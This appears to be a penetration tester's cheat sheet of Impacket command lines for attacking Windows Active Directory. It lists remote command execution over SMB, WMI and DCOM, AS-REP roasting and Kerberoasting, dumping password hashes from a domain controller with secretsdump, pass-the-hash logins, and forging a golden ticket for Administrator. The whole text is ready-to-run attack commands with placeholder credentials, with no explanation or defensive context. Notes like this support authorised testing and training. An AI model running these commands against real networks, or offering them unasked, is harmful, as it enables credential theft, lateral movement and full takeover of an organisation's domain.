# SMB Tools
impacket-psexec domain/user:pass@$DC
impacket-smbexec domain/user:pass@$DC
impacket-wmiexec domain/user:pass@$DC
impacket-atexec domain/user:pass@$DC "whoami"
impacket-dcomexec domain/user:pass@$DC
impacket-reg domain/user:pass@$DC
impacket-services domain/user:pass@$DC

# Kerberos Tools
impacket-GetNPUsers domain.local/ -usersfile users.txt
impacket-GetUserSPNs domain.local/user:pass -request
impacket-GetTGT domain.local/user -hashes LM:NT
impacket-GetST domain.local/user -spn cifs/target.domain.local

# Secretsdump
impacket-secretsdump domain/user:pass@$DC
impacket-secretsdump -just-dc domain/user:pass@$DC
impacket-secretsdump -hashes LM:NT domain/user@$DC

# Other Tools
impacket-lookupsid domain/user:pass@$DC
impacket-rpcdump -port 135 $DC
impacket-samrdump $DC
impacket-ticketer -nthash HASH -domain-sid SID -domain domain.local Administrator